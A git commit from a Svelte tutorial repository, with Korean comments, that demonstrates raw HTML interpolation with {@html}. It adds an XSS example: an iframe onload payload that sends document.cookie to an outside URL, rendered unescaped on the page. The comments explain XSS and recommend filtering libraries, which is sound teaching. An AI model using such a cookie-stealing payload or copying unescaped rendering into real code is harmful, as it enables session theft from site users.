11ed74ab0851ce64344a787fd65832f542f66e77
ChoJinmok <jjmok1127@gmail.com>
2023-02-08 02:32:47 +0900

    Add: 보간법 / 2. 원시 HTML

--- src/App.svelte
+++ src/App.svelte
@@ -1,23 +1,17 @@
 <script lang="ts">
-  const href = 'https://heropy.blog';
-  const name = 'Heropy';
-  let value = 'New input value!';
-  const isUpperCase = false;
+  const h1 = '<h1>Hello Heropy</h1>';
+
+  // documnet.cookie에 로그인 정보가 담겨있다고 가정 -> XSS 공격 가능
+  // 내용을 필터링할 수 있는 라이브러리 사용하는 것이 좋다.
+  const xss = '<iframe onload="document.location=`https://heropy.blog?${documnet.cookie}`"></iframe>';
 </script>
 
-<!-- <a href="https://heropy.blog">Heropy</a> -->
-<a {href}>{name}</a>
-
-<!-- <input type="text" value="Default value.." /> -->
-<input
-  {value}
-  on:input={(e) => { value = e.target.value; }} />
-<!-- 단방향 바인딩과 양방향 바인딩의 보간법은 조금 다르다. -->
-<input bind:value />
+<!-- `@` 기호는 `at-sign`이라고 부른다. -->
+{@html h1}
+<!-- html로 해석돼서 들어가야하는 문자열이 있으면 보간법 내부에서 앞쪽에 html 키워드를 붙여준다. -->
 
 <!--
-다른 프레임워크나 라이브러리는 보간법 사이에 표현식이나 함수내용을 작성하는 것을 권장하지 않는다. -> 해당하는 내용이 반복될 때 성능적으로 문제가 생길 수 있다.
-단, svelte는 컴파일러이기 때문에 전체 코드를 번들하기 전에 평가할 수 있고 그때 충분히 최적화가 가능하다.
--> svelte에서 보간법은 코드량을 줄일 수 있는 방법으로 권장되고 있다.
+XSS(Cross Site Scripting, 사이트 간 스크립팅)은 웹 취약점 중 하나로
+웹사이트 관리자가 아닌 제3자가 웹에 악성 스크립트를 삽입할 수 있는 것을 의미한다.
 -->
-<div>{isUpperCase ? 'DIV' : 'div'}</div>
+{@html xss}
